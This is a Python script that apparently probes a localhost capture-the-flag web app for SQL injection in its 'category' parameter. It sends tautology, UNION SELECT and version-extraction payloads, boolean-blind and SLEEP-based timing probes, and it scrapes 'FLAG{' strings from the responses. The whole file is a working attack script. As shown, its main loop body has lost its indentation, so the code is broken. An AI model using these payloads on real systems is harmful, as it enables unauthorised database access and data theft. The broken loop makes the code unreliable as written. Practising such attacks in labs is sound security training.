import requests, time

url = "http://127.0.0.1:33164/index.php"
cookies = {"PHPSESSID": "8993d695eb127fdc823416d1f8ee85ae"}

print("SQLi Test - Category Parameter\n")

# Baseline
r = requests.get(url, params={"category": "Nature"}, cookies=cookies, timeout=10)
base_len = len(r.text)
print(f"Baseline: {base_len}B\n")

# Test payloads
payloads = [
    "Nature' OR '1'='1--",
    "Nature' UNION SELECT 1,2,3,4,5--",
    "Nature' UNION SELECT @@version--"
]

for p in payloads:
r = requests.get(url, params={"category": p}, cookies=cookies, timeout=10)
len_diff = len(r.text) - base_len
print(f"Payload: {p}")
print(f"  Status: {r.status_code}, Length: {len(r.text)}B (diff: {len_diff:+d}B)")
if "FLAG{" in r.text:
    flag = r.text[r.text.find("FLAG{"):r.text.find("}", r.text.find("FLAG{"))+1]
    print(f"  FLAG: {flag}")
if "SQL" in r.text.upper() or "error" in r.text.lower():
    print(f"  SQL ERROR: {r.text[:200]}")
print()

# Boolean test
print("Boolean blind test:")
r1 = requests.get(url, params={"category": "Nature' AND 1=1--"}, cookies=cookies, timeout=10)
r2 = requests.get(url, params={"category": "Nature' AND 1=2--"}, cookies=cookies, timeout=10)
print(f"  True: {len(r1.text)}B, False: {len(r2.text)}B")
if len(r1.text) != len(r2.text):
    print(f"  BOOLEAN INJECTION DETECTED!")

# Time-based test
print("\nTime-based test:")
start = time.time()
r = requests.get(url, params={"category": "Nature' AND SLEEP(5)--"}, cookies=cookies, timeout=20)
elapsed = time.time() - start
print(f"  Time: {elapsed:.2f}s")
if elapsed > 4.5:
    print(f"  TIME DELAY DETECTED!")

print("\nTest complete.")
